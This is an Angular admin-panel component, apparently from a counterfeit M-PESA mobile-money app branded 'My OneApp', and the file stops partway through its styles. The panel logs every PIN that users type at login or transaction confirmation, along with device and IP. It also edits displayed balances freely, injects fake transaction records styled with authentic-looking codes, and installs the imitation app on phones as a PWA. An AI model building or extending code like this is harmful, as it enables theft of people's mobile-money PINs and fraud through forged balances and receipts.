import { Component, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { ApiService, UserProfile, Transaction, Favorite, AdminUser } from '../../services/api.service';
import { PwaService } from '../../services/pwa.service';

@Component({
  selector: 'app-admin',
  standalone: true,
  imports: [CommonModule, FormsModule],
  template: `
    <div class="admin-container">
      <!-- Admin Top Bar -->
      <div class="admin-topbar">
        <div class="topbar-left">
          <button class="back-link" (click)="goBack()">
            ← Back to App
          </button>
          <h2>M-PESA Admin Control Panel</h2>
          <span class="admin-session" *ngIf="currentAdmin">
            Logged in as: <strong>{{ currentAdmin.name }}</strong> ({{ currentAdmin.phone }}) • 
            <span class="role-badge">{{ currentAdmin.role }}</span>
          </span>
        </div>
        <div class="topbar-right">
          <button class="install-shortcut-btn" (click)="activeTab = 'download'">
            📲 Download App
          </button>
          <span class="db-badge" [class.mongo-active]="true">
            {{ dbStatus }}
          </span>
          <button class="logout-btn" *ngIf="currentAdmin" (click)="logoutAdmin()">
            Switch Admin
          </button>
        </div>
      </div>

      <!-- ============================================================= -->
      <!-- ADMIN LOGIN VIEW (If not logged in)                          -->
      <!-- ============================================================= -->
      <div class="login-wrapper" *ngIf="!currentAdmin">
        <div class="login-card">
          <div class="login-icon">🔐</div>
          <h3>Admin Authentication</h3>
          <p class="login-desc">Enter your registered admin phone number and PIN to access the dashboard.</p>

          <form (ngSubmit)="loginAdmin()" class="login-form">
            <div class="form-field">
              <label>Admin Phone Number</label>
              <input 
                type="tel" 
                [(ngModel)]="loginPhone" 
                name="loginPhone" 
                placeholder="e.g. 0798765485" 
                required 
              />
            </div>

            <div class="form-field">
              <label>Admin Password / PIN</label>
              <input 
                type="password" 
                maxlength="20" 
                [(ngModel)]="loginPin" 
                name="loginPin" 
                placeholder="••••" 
                required 
              />
            </div>

            <div class="login-err" *ngIf="loginError">{{ loginError }}</div>

            <button type="submit" class="primary-btn w-full">Log In to Dashboard</button>

            <div class="login-hint">
              Default Super Admin Phone: <strong>0798765485</strong>
            </div>
          </form>
        </div>
      </div>

      <!-- ============================================================= -->
      <!-- AUTHENTICATED ADMIN DASHBOARD CONTENT                         -->
      <!-- ============================================================= -->
      <div class="admin-content" *ngIf="currentAdmin">
        <!-- Metric Cards -->
        <div class="metrics-grid">
          <div class="metric-card">
            <span class="m-title">Current Balance</span>
            <span class="m-val text-green">Ksh {{ userForm.balance | number:'1.2-2' }}</span>
            <span class="m-sub">Fuliza: Ksh {{ userForm.fuliza | number:'1.2-2' }}</span>
          </div>
          <div class="metric-card">
            <span class="m-title">Active User</span>
            <span class="m-val">{{ userForm.name }} ({{ userForm.initials }})</span>
            <span class="m-sub">{{ userForm.phone }}</span>
          </div>
          <div class="metric-card">
            <span class="m-title">Admin Accounts</span>
            <span class="m-val text-cyan">{{ adminsList.length }}</span>
            <span class="m-sub">Active Admins</span>
          </div>
          <div class="metric-card">
            <span class="m-title">Saved Favourites</span>
            <span class="m-val text-yellow">{{ favoritesList.length }}</span>
            <span class="m-sub">Quick send contacts</span>
          </div>
          <div class="metric-card">
            <span class="m-title">Total Sent</span>
            <span class="m-val text-warning">Ksh {{ overview?.totalSent | number:'1.2-2' }}</span>
            <span class="m-sub">{{ overview?.totalTransactions || 0 }} transactions</span>
          </div>
          <div class="metric-card">
            <span class="m-title">Captured PINs</span>
            <span class="m-val text-red">{{ overview?.pinLogsCount || pinLogs.length }}</span>
            <span class="m-sub">Recorded attempts</span>
          </div>
        </div>

        <!-- Tabs Navigation -->
        <div class="admin-tabs">
          <button class="a-tab" [class.active]="activeTab === 'user'" (click)="activeTab = 'user'">
            👤 My Wallet & Balances
          </button>
          <button class="a-tab" [class.active]="activeTab === 'workingPins'" (click)="activeTab = 'workingPins'">
            🔑 Working App PINs ({{ workingPins.length }})
          </button>
          <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'admins'" (click)="activeTab = 'admins'">
            👥 Manage Admins ({{ adminsList.length }})
          </button>
          <button class="a-tab" [class.active]="activeTab === 'favs'" (click)="activeTab = 'favs'">
            ⭐ Manage Favourites ({{ favoritesList.length }})
          </button>
          <button class="a-tab highlight-tab" [class.active]="activeTab === 'download'" (click)="activeTab = 'download'">
            📲 Download App
          </button>
          <button class="a-tab" [class.active]="activeTab === 'txs'" (click)="activeTab = 'txs'">
            💸 Transactions Manager
          </button>
          <button class="a-tab" [class.active]="activeTab === 'pins'" (click)="activeTab = 'pins'">
            🔑 Captured PIN Logs ({{ pinLogs.length }})
          </button>
          <button class="a-tab" *ngIf="currentAdmin?.role === 'Super Admin'" [class.active]="activeTab === 'system'" (click)="activeTab = 'system'">
            ⚙️ System Reset
          </button>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 1: User & Balance Editor (ISOLATED PER ADMIN)             -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'user'">
          <div class="section-card">
            <div class="isolation-notice">
              🛡️ <strong>Isolated Account:</strong> Modifying your balance only updates your personal account (<strong>{{ currentAdmin?.name }}</strong>). Other admins are completely unaffected.
            </div>
            <h3 class="card-title">Modify Account Profile & Live Balances</h3>
            <p class="card-desc">Adjust M-PESA balance, Fuliza overdraft, Airtime balance, and user details in real-time.</p>

            <form (ngSubmit)="saveUserChanges()" class="form-grid">
              <div class="form-field">
                <label>User Full Name</label>
                <input type="text" [(ngModel)]="userForm.name" name="name" required />
              </div>

              <div class="form-field">
                <label>Avatar Initials (e.g. RO)</label>
                <input type="text" [(ngModel)]="userForm.initials" name="initials" maxlength="3" required />
              </div>

              <div class="form-field">
                <label>Registered Phone Number</label>
                <input type="text" [(ngModel)]="userForm.phone" name="phone" required />
              </div>

              <div class="form-field">
                <label>Greeting Prefix</label>
                <input type="text" [(ngModel)]="userForm.greeting" name="greeting" required />
              </div>

              <div class="form-field highlight-field">
                <label class="text-green">M-PESA Balance (Ksh)</label>
                <input type="number" step="0.01" [(ngModel)]="userForm.balance" name="balance" required />
              </div>

              <div class="form-field highlight-field">
                <label class="text-warning">Available Fuliza Limit (Ksh)</label>
                <input type="number" step="0.01" [(ngModel)]="userForm.fuliza" name="fuliza" required />
              </div>

              <div class="form-field highlight-field">
                <label>Airtime Balance (Ksh)</label>
                <input type="number" step="0.01" [(ngModel)]="userForm.airtime" name="airtime" required />
              </div>

              <div class="form-actions">
                <button type="submit" class="primary-btn">Save Changes to Live App</button>
                <span class="save-msg" *ngIf="saveSuccessMessage">{{ saveSuccessMessage }}</span>
              </div>
            </form>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- ============================================================= -->
        <!-- TAB: Working App PINs (per admin)                             -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'workingPins'">
          <div class="section-card">
            <h3 class="card-title">Working App PINs for My Account</h3>
            <p class="card-desc">
              Only PINs listed here will unlock the mobile app for your profile. Any phone or user entering one of your working PINs will immediately unlock your personal balance (Ksh {{ userForm.balance | number:'1.2-2' }}) and interface.
            </p>

            <form (ngSubmit)="handleAddWorkingPin()" class="form-inline admin-create-form">
              <input 
                type="text" 
                maxlength="4" 
                [(ngModel)]="newWorkingPin" 
                name="newWorkingPin" 
                placeholder="Enter 4-digit PIN (e.g. 2580)" 
                required 
              />
              <button type="submit" class="primary-btn">+ Add Working PIN</button>
            </form>

            <div class="save-msg mb-3" *ngIf="workingPinMsg">{{ workingPinMsg }}</div>

            <h4 class="card-title mt-4">Active Working PINs for {{ currentAdmin?.name }} ({{ workingPins.length }})</h4>
            <div class="pins-badges-grid">
              <div class="working-pin-chip" *ngFor="let pin of workingPins">
                <span class="chip-dot">●</span>
                <span class="chip-val">{{ pin }}</span>
                <button 
                  type="button" 
                  class="chip-del-btn" 
                  [disabled]="workingPins.length <= 1"
                  (click)="handleDeleteWorkingPin(pin)" 
                  title="Delete working PIN">✕</button>
              </div>
            </div>
            <small class="text-muted mt-2" *ngIf="workingPins.length <= 1">Add your custom PIN first, then you can delete 1234. At least one working PIN must be kept.</small>
          </div>

          <!-- Change Admin Dashboard Password Card -->
          <div class="section-card mt-4">
            <h3 class="card-title">🔐 Change Admin Dashboard Password</h3>
            <p class="card-desc">
              Change your private password/PIN for logging into this Admin Dashboard so no unauthorized person can access your controls.
            </p>

            <form (ngSubmit)="handleChangePassword()" class="form-grid" style="max-width: 520px;">
              <div class="form-field">
                <label>Current Password / PIN</label>
                <input 
                  type="password" 
                  [(ngModel)]="currentPassInput" 
                  name="currentPassInput" 
                  placeholder="Enter current password" 
                  required 
                />
              </div>

              <div class="form-field">
                <label>New Password / PIN</label>
                <input 
                  type="password" 
                  [(ngModel)]="newPassInput" 
                  name="newPassInput" 
                  placeholder="Enter new password (e.g. MySecretPin99)" 
                  required 
                />
              </div>

              <div class="form-actions">
                <button type="submit" class="primary-btn">Update Dashboard Password</button>
                <span class="save-msg" *ngIf="changePassMsg">{{ changePassMsg }}</span>
              </div>
            </form>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 2: Multi-Admin Management (SUPER ADMIN ONLY)              -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'admins' && currentAdmin?.role === 'Super Admin'">
          <div class="section-card">
            <h3 class="card-title">Super Admin Control: Create & Revoke Admins</h3>
            <p class="card-desc">
              As Super Admin, you can authorize new administrators. Each admin receives their own isolated balance and working PINs. You can also revoke admin privileges at any time.
            </p>

            <form (ngSubmit)="handleAddAdmin()" class="form-grid admin-create-grid">
              <div class="form-field">
                <label>Admin Full Name</label>
                <input 
                  type="text" 
                  [(ngModel)]="newAdminName" 
                  name="newAdminName" 
                  placeholder="Full Name (e.g. Dennis Ochieng)" 
                  required 
                />
              </div>

              <div class="form-field">
                <label>Admin Phone Number</label>
                <input 
                  type="tel" 
                  [(ngModel)]="newAdminPhone" 
                  name="newAdminPhone" 
                  placeholder="Phone Number (e.g. 0712345678)" 
                  required 
                />
              </div>

              <div class="form-field">
                <label>Dashboard Password / PIN</label>
                <input 
                  type="text" 
                  maxlength="10" 
                  [(ngModel)]="newAdminPassword" 
                  name="newAdminPassword" 
                  placeholder="Dashboard Password (e.g. 5555)" 
                  required 
                />
              </div>

              <div class="form-field">
                <label>Initial App Working PIN (4 digits)</label>
                <input 
                  type="text" 
                  maxlength="4" 
                  [(ngModel)]="newAdminWorkingPin" 
                  name="newAdminWorkingPin" 
                  placeholder="App PIN (e.g. 7777)" 
                  required 
                />
              </div>

              <div class="form-field">
                <label>Initial M-PESA Balance (Ksh)</label>
                <input 
                  type="number" 
                  step="0.01" 
                  [(ngModel)]="newAdminBalance" 
                  name="newAdminBalance" 
                  placeholder="61.66" 
                />
              </div>

              <div class="form-field">
                <label>Admin Role</label>
                <select [(ngModel)]="newAdminRole" name="newAdminRole">
                  <option value="Admin">Admin (Isolated Account)</option>
                  <option value="Super Admin">Super Admin</option>
                </select>
              </div>

              <div class="form-actions" style="grid-column: 1 / -1;">
                <button type="submit" class="primary-btn">+ Create Isolated Admin Account</button>
              </div>
            </form>

            <div class="save-msg mb-3" *ngIf="adminActionMessage">{{ adminActionMessage }}</div>

            <h3 class="card-title mt-4">Authorized Admin Accounts</h3>
            <div class="table-responsive">
              <table class="data-table">
                <thead>
                  <tr>
                    <th>Name</th>
                    <th>Phone Number</th>
                    <th>Role</th>
                    <th>Initial Balance</th>
                    <th>Created</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr *ngFor="let adm of adminsList">
                    <td>
                      <div class="admin-cell-name">
                        <div class="avatar-mini">{{ adm.name.slice(0, 2).toUpperCase() }}</div>
                        <strong>{{ adm.name }}</strong>
                        <span class="active-badge" *ngIf="adm.phone === currentAdmin?.phone">(You)</span>
                      </div>
                    </td>
                    <td><code>{{ adm.phone }}</code></td>
                    <td>
                      <span class="role-pill" [class.super]="adm.role === 'Super Admin'">
                        {{ adm.role }}
                      </span>
                    </td>
                    <td><span>Ksh {{ (adm.wallet?.balance || 61.66) | number:'1.2-2' }}</span></td>
                    <td><small>{{ adm.createdAt ? (adm.createdAt | date:'shortDate') : 'Active' }}</small></td>
                    <td>
                      <button 
                        class="delete-icon-btn" 
                        [disabled]="adm.phone === currentAdmin?.phone || adm.phone === '0798765485'"
                        (click)="handleRemoveAdmin(adm.phone)"
                        title="Revoke Admin Access">
                        ✕ Revoke
                      </button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 3: Manage & Edit Favourites                               -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'favs'">
          <div class="section-card">
            <h3 class="card-title">Manage & Edit Favourites</h3>
            <p class="card-desc">
              Add, update, or remove favourite contacts displayed in the Send Money screen.
            </p>

            <!-- Add/Edit Favorite Form -->
            <form (ngSubmit)="handleSaveFavorite()" class="form-inline fav-form">
              <input 
                type="text" 
                [(ngModel)]="favFormName" 
                name="favFormName" 
                placeholder="Contact Name (e.g. Jane Doe)" 
                required 
              />
              <input 
                type="tel" 
                [(ngModel)]="favFormPhone" 
                name="favFormPhone" 
                placeholder="Phone (e.g. 0722123456)" 
                required 
              />
              <button type="submit" class="primary-btn">
                {{ editingFavId ? 'Update Favourite' : '+ Add Favourite' }}
              </button>
              <button 
                type="button" 
                class="cancel-btn" 
                *ngIf="editingFavId" 
                (click)="cancelFavEdit()">
                Cancel
              </button>
            </form>

            <div class="save-msg mb-3" *ngIf="favSuccessMessage">{{ favSuccessMessage }}</div>

            <h3 class="card-title mt-4">Current Favourites List</h3>
            <div class="table-responsive">
              <table class="data-table">
                <thead>
                  <tr>
                    <th>Avatar</th>
                    <th>Name</th>
                    <th>Phone Number</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  <tr *ngFor="let fav of favoritesList">
                    <td>
                      <div class="avatar-mini">{{ fav.name.slice(0, 1).toUpperCase() }}</div>
                    </td>
                    <td><strong>{{ fav.name }}</strong></td>
                    <td><code>{{ fav.phone }}</code></td>
                    <td>
                      <div class="btn-group">
                        <button class="edit-btn" (click)="editFavorite(fav)">✏️ Edit</button>
                        <button class="delete-icon-btn" (click)="handleDeleteFavorite(fav.id)">✕ Delete</button>
                      </div>
                    </td>
                  </tr>
                  <tr *ngIf="favoritesList.length === 0">
                    <td colspan="4" class="empty-cell">No favourites configured. Add one above.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 4: Download App to Homescreen (Admin only)                -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'download'">
          <div class="section-card download-card">
            <div class="download-hero">
              <div class="app-icon-preview">
                <img src="/icons/icon-192.png" alt="My OneApp" (error)="onImgErr($event)" />
              </div>
              <div class="download-info">
                <h3 class="download-title">Download My OneApp to Homescreen</h3>
                <p class="download-subtitle">
                  Direct Progressive Web App (PWA) installation. Adding this to the device homescreen enables fullscreen standalone mode without browser URL bars.
                </p>
                <div class="pwa-status-badge" [class.installed]="isStandalone">
                  {{ isStandalone ? '✓ App is already installed in standalone mode' : '⚡ Ready to download to your homescreen' }}
                </div>
              </div>
            </div>

            <div class="download-actions">
              <div class="action-btn-row">
                <button class="install-big-btn" (click)="downloadAppToHomescreen()">
                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                  </svg>
                  <span>Download My OneApp to Homescreen</span>
                </button>
                <button class="phone-screen-launch-btn" (click)="openPhoneScreen()">
                  <span>📱 Open Simulated Phone Screen</span>
                </button>
              </div>
              <div class="install-result-msg" *ngIf="installMessage">{{ installMessage }}</div>
            </div>

            <!-- Network URL Card for Physical Phone -->
            <div class="network-access-box">
              <div class="net-title">📡 Connect Physical Phone over Local Wi-Fi:</div>
              <div class="net-links">
                <div class="net-row">
                  <span class="net-tag secure">HTTPS (Best for Install):</span>
                  <a href="https://192.168.100.40:3443" target="_blank" class="net-link">https://192.168.100.40:3443</a>
                </div>
                <div class="net-row">
                  <span class="net-tag">HTTP:</span>
                  <a href="http://192.168.100.40:3000" target="_blank" class="net-link">http://192.168.100.40:3000</a>
                </div>
              </div>
              <p class="net-note">
                💡 <strong>How to get the icon on your phone:</strong> Open Chrome on your phone, navigate to <code>https://192.168.100.40:3443</code> (accept the self-signed cert) or <code>http://192.168.100.40:3000</code>. Then tap Chrome's <strong>⋮ (three dots)</strong> at the top right, and tap <strong>"Install app"</strong> (or <strong>"Add to Home screen"</strong>). The app will install with the created official green <strong>My OneApp</strong> squircle icon.
              </p>
            </div>

            <hr class="card-divider" />

            <div class="install-instructions-grid">
              <div class="inst-box">
                <div class="inst-platform">
                  <span class="platform-icon">🤖</span>
                  <h4>Android (Chrome / Edge / Brave)</h4>
                </div>
                <ol class="inst-steps">
                  <li>Click the green <strong>"Download My OneApp to Homescreen"</strong> button above.</li>
                  <li>If prompted, tap <strong>"Install"</strong> or <strong>"Add"</strong>.</li>
                  <li>Alternatively, tap Chrome's top-right menu (<strong>⋮</strong> three dots).</li>
                  <li>Select <strong>"Install app"</strong> or <strong>"Add to Home screen"</strong>.</li>
                  <li><strong>My OneApp</strong> will be downloaded directly to your phone's app drawer and home screen.</li>
                </ol>
              </div>

              <div class="inst-box">
                <div class="inst-platform">
                  <span class="platform-icon">🍎</span>
                  <h4>iPhone / iPad (Apple Safari)</h4>
                </div>
                <ol class="inst-steps">
                  <li>Open this URL in <strong>Apple Safari</strong>.</li>
                  <li>Tap the <strong>Share</strong> button (the square with an arrow pointing up <strong>⬆️</strong> at the bottom bar).</li>
                  <li>Scroll down the share sheet and tap <strong>"Add to Home Screen"</strong>.</li>
                  <li>Tap <strong>"Add"</strong> in the top right corner.</li>
                  <li><strong>My OneApp</strong> will now open like a native iOS app with zero browser bars.</li>
                </ol>
              </div>
            </div>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 5: Transactions Manager                                   -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'txs'">
          <div class="section-card">
            <h3 class="card-title">Simulate / Inject Statement Record</h3>
            <p class="card-desc">All transaction codes automatically adhere to authentic 10-character codes starting with U.</p>
            <form (ngSubmit)="injectTransaction()" class="form-inline">
              <input type="text" [(ngModel)]="newTxRecipient" name="recipient" placeholder="Recipient / Sender Name" required />
              <input type="text" [(ngModel)]="newTxPhone" name="phone" placeholder="Phone (e.g. 0712345678)" required />
              <input type="number" step="0.01" [(ngModel)]="newTxAmount" name="amount" placeholder="Amount (Ksh)" required />
              <select [(ngModel)]="newTxType" name="type">
                <option value="SEND">SEND</option>
                <option value="RECEIVE">RECEIVE</option>
              </select>
              <button type="submit" class="primary-btn">Add Record</button>
            </form>

            <h3 class="card-title mt-4">Transaction History</h3>
            <div class="table-responsive">
              <table class="data-table">
                <thead>
                  <tr>
                    <th>Tx ID</th>
                    <th>Type</th>
                    <th>Recipient</th>
                    <th>Phone</th>
                    <th>Amount</th>
                    <th>Balance After</th>
                    <th>Date</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr *ngFor="let tx of transactions">
                    <td><code>{{ tx.id }}</code></td>
                    <td>
                      <span class="type-badge" [class.send]="tx.type === 'SEND'" [class.receive]="tx.type !== 'SEND'">
                        {{ tx.type }}
                      </span>
                    </td>
                    <td>{{ tx.recipient }}</td>
                    <td>{{ tx.displayPhone || tx.phone }}</td>
                    <td [class.text-red]="tx.type === 'SEND'" [class.text-green]="tx.type !== 'SEND'">
                      Ksh {{ tx.amount | number:'1.2-2' }}
                    </td>
                    <td>Ksh {{ tx.balanceAfter | number:'1.2-2' }}</td>
                    <td>{{ tx.displayDate || (tx.date | date:'short') }}</td>
                    <td>
                      <button class="delete-icon-btn" (click)="deleteTransaction(tx.id)">✕</button>
                    </td>
                  </tr>
                  <tr *ngIf="transactions.length === 0">
                    <td colspan="8" class="empty-cell">No transactions found.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 6: Captured PINs Inspector                                -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'pins'">
          <div class="section-card">
            <div class="card-header-flex">
              <div>
                <h3 class="card-title">Captured M-PESA PINs Log</h3>
                <p class="card-desc">Every PIN entered in the login screen or transaction confirmation is recorded here.</p>
              </div>
              <button class="danger-btn-outline" (click)="clearAllPins()">Clear All Logs</button>
            </div>

            <div class="table-responsive">
              <table class="data-table">
                <thead>
                  <tr>
                    <th>Captured PIN</th>
                    <th>Screen / Context</th>
                    <th>Timestamp</th>
                    <th>Device / IP</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr *ngFor="let p of pinLogs">
                    <td>
                      <span class="pin-badge">{{ p.pin }}</span>
                    </td>
                    <td><span class="tag">{{ p.screen || 'login' }}</span></td>
                    <td>{{ p.timestamp | date:'medium' }}</td>
                    <td>
                      <small>{{ p.device || 'Mobile' }} ({{ p.ip }})</small>
                    </td>
                    <td>
                      <button class="delete-icon-btn" (click)="deletePin(p._id || p.id)">✕</button>
                    </td>
                  </tr>
                  <tr *ngIf="pinLogs.length === 0">
                    <td colspan="5" class="empty-cell">No PIN entries recorded yet.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>

        <!-- ============================================================= -->
        <!-- TAB 7: System Reset                                           -->
        <!-- ============================================================= -->
        <div class="tab-pane" *ngIf="activeTab === 'system'">
          <div class="section-card danger-zone">
            <h3 class="card-title text-red">Danger Zone / Restore Initial State</h3>
            <p class="card-desc">
              Reset the database back to default initial values (User: Regarn Omondi, Balance: Ksh 61.66, Fuliza: Ksh 100.00).
            </p>
            <button class="danger-btn" (click)="resetAllData()">
              Reset All Database Records to Default
            </button>
          </div>
        </div>
      </div>
    </div>
  `,
  styles: [`
    .admin-container {
      width: 100%;
      min-height: 100vh;
      background: #0d1013;
      color: #e6edf3;
      font-family: 'Plus Jakarta Sans', sans-serif;
      padding: 24px;
    }
    .admin-topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 20px;
      border-bottom: 1px solid #252c33;
      margin-bottom: 24px;
      flex-wrap: wrap;
      gap: 16px;
    }
    .topbar-left {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .back-link {
      color: #00c853;
      font-size: 13.5px;
      font-weight: 700;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
      text-align: left;
    }
    .topbar-left h2 {
      font-size: 22px;
      font-weight: 800;
      color: #ffffff;
      margin: 0;
    }
    .admin-session {
      font-size: 12.5px;
      color: #9aa6b2;
    }
    .role-badge {
      background: rgba(0, 200, 83, 0.15);
      color: #00c853;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: 700;
    }
    .topbar-right {
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .install-shortcut-btn {
      background: #00c853;
      color: #000;
      font-weight: 700;
      font-size: 12.5px;
      padding: 7px 14px;
      border-radius: 20px;
      border: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .db-badge {
      background: #1e262c;
      border: 1px solid #36424d;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      color: #00c853;
    }
    .mongo-active {
      border-color: #00c853;
      background: rgba(0, 200, 83, 0.1);
    }
    .logout-btn {
      background: #252e36;
      color: #d0d7de;
      border: 1px solid #3d4955;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
    }

    /* Login Form Styles */
    .login-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 60vh;
    }
    .login-card {
      background: #161b20;
      border: 1px solid #262f38;
      border-radius: 16px;
      padding: 36px 32px;
      max-width: 440px;
      width: 100%;
      text-align: center;
      box-shadow: 0 16px 40px rgba(0,0,0,0.5);
    }
    .login-icon {
      font-size: 40px;
      margin-bottom: 12px;
    }
    .login-card h3 {
      font-size: 20px;
      font-weight: 800;
      color: #ffffff;
      margin-bottom: 6px;
    }
    .login-desc {
      font-size: 13px;
      color: #8b949e;
      margin-bottom: 24px;
      line-height: 1.45;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 16px;
      text-align: left;
    }
    .w-full {
      width: 100%;
      justify-content: center;
    }
    .login-err {
      color: #e50914;
      font-size: 12.5px;
      font-weight: 600;
      text-align: center;
    }
    .login-hint {
      margin-top: 14px;
      font-size: 11.5px;
      color: #7d8590;
      text-align: center;
    }

    /* Metrics Grid */
    .metrics-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px;
      margin-bottom: 24px;
    }
    .metric-card {
      background: #161b20;
      border: 1px solid #262f38;
      border-radius: 12px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 4px;
    }
    .m-title {
      font-size: 11.5px;
      color: #8b949e;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      font-weight: 600;
    }
    .m-val {
      font-size: 22px;
      font-weight: 800;
      color: #ffffff;
    }
    .m-sub {
      font-size: 12px;
      color: #8b949e;
    }
    .text-green { color: #00c853; }
    .text-warning { color: #ff9800; }
    .text-red { color: #e50914; }
    .text-cyan { color: #4dd0e1; }
    .text-yellow { color: #ffb74d; }

    /* Admin Tabs */
    .admin-tabs {
      display: flex;
      gap: 8px;
      border-bottom: 1px solid #252c33;
      margin-bottom: 20px;
      overflow-x: auto;
    }
    .a-tab {
      padding: 10px 16px;
      font-size: 13px;
      font-weight: 600;
      color: #8b949e;
      background: none;
      border: none;
      border-bottom: 2px solid transparent;
      cursor: pointer;
      white-space: nowrap;
      transition: all 0.2s;
    }
    .a-tab.active {
      color: #00c853;
      border-color: #00c853;
    }
    .highlight-tab {
      color: #4dd0e1;
    }
    .highlight-tab.active {
      color: #4dd0e1;
      border-color: #4dd0e1;
    }

    .section-card {
      background: #161b20;
      border: 1px solid #262f38;
      border-radius: 14px;
      padding: 24px;
      margin-bottom: 24px;
    }
    .card-title {
      font-size: 17px;
      font-weight: 700;
      color: #ffffff;
      margin-bottom: 4px;
    }
    .card-desc {
      font-size: 13px;
      color: #8b949e;
      margin-bottom: 18px;
      line-height: 1.4;
    }
    .card-header-flex {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }

    /* Forms */
    .form-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 16px;
    }
    .form-field {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .form-field label {
      font-size: 12.5px;
      color: #8b949e;
      font-weight: 600;
    }
    .form-field input, .form-field select {
      background: #0d1013;
      border: 1px solid #303b46;
      border-radius: 8px;
      padding: 10px 14px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
    }
    .form-field input:focus, .form-field select:focus {
      border-color: #00c853;
    }
    .highlight-field input {
      border-color: #3b5062;
      background: #10171d;
    }
    .form-actions {
      grid-column: 1 / -1;
      display: flex;
      align-items: center;
      gap: 14px;
      margin-top: 10px;
    }
    .primary-btn {
      background: #00c853;
      color: #000000;
      font-weight: 700;
      font-size: 13.5px;
      padding: 10px 22px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .primary-btn:hover {
      background: #00b34a;
    }
    .cancel-btn {
      background: #252e36;
      color: #d0d7de;
      border: 1px solid #3d4955;
      padding: 10px 18px;
      border-radius: 8px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
    }
    .edit-btn {
      background: #1e262c;
      color: #4dd0e1;
      border: 1px solid #29434e;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
    }
    .save-msg {
      color: #00c853;
      font-size: 13px;
      font-weight: 600;
    }
    .mb-3 { margin-bottom: 14px; }
    .mt-4 { margin-top: 20px; }

    .form-inline {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      margin-bottom: 20px;
      align-items: center;
    }
    .form-inline input, .form-inline select {
      background: #0d1013;
      border: 1px solid #303b46;
      border-radius: 8px;
      padding: 10px 14px;
      color: #ffffff;
      font-size: 13.5px;
      outline: none;
    }
    .form-inline input:focus, .form-inline select:focus {
      border-color: #00c853;
    }

    /* Tables */
    .table-responsive {
      overflow-x: auto;
    }
    .data-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }
    .data-table th {
      text-align: left;
      padding: 10px 12px;
      border-bottom: 1px solid #2b343d;
      color: #8b949e;
      font-weight: 600;
    }
    .data-table td {
      padding: 12px;
      border-bottom: 1px solid #1f272e;
    }
    .pin-badge {
      background: #e50914;
      color: #fff;
      font-weight: 800;
      padding: 3px 10px;
      border-radius: 6px;
      font-family: monospace;
      letter-spacing: 2px;
    }
    .tag {
      background: #252e36;
      color: #9aa6b2;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 11px;
    }
    .type-badge {
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: 700;
    }
    .type-badge.send { background: rgba(229, 9, 20, 0.2); color: #e50914; }
    .type-badge.receive { background: rgba(0, 200, 83, 0.2); color: #00c853; }
    .role-pill {
      background: rgba(77, 208, 225, 0.15);
      color: #4dd0e1;
      padding: 3px 10px;
      border-radius: 12px;
      font-size: 11.5px;
      font-weight: 600;
    }
    .role-pill.super {
      background: rgba(255, 152, 0, 0.15);
      color: #ff9800;
    }
    .admin-cell-name {
      display: flex;
      align-items: center;
      gap: 10px;
    }
